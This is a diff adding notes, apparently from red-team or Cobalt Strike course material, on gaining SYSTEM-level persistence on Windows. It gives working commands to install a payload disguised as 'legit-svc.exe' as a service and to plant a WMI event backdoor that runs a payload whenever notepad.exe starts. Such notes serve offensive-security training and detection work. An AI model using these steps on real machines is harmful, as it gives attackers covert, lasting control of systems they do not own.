@@ -110,4 +110,37 @@ Add a duplicate entry into HKCU pointing to our DLL (as above), and this will be
 &nbsp;
 <span style="font-size: 35px; color:red"><b>Host Persistence (SYSTEM)</b></span>
 &nbsp;
+On High Integrity shells/beacons. DO NOT USE HTTP Beacons as SYSTEM cannot authenticate to web proxies. Use P2P or DNS.
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Create a Service</b></span>
+```powershell
+cd C:\Windows
+upload C:\Payloads\tcp-local_x64.svc.exe
+mv tcp-local_x64.svc.exe legit-svc.exe
 
+execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+```
+This creates a STOPPED Service. Once the machine will restart, the service will do the same.
+&nbsp;
+
+---
+&nbsp;
+<span style="font-size: 25px; color:white"><b>Persistence via WMI events</b></span>
+Through EventConsumer, EventFilter, FilterToConsumerBuilding.
+[PowerLurk](https://github.com/Sw4mpf0x/PowerLurk) is a PowerShell tool for building WMI events.
+```powershell
+cd C:\Windows
+upload C:\Payloads\dns_x64.exe
+powershell-import C:\Tools\PowerLurk.ps1
+powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+```
+Double check the classes using:
+```powershell
+Get-WmiEvent -Name WmiBackdoor
+```
+If you open the process declared on the commands above (<span style="color:red">notepad.exe</span>), <span style="color:red">dns_x64.exe</span> will trigger.
+
+Remove the backdoor with:
+```powershell
+Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
+```
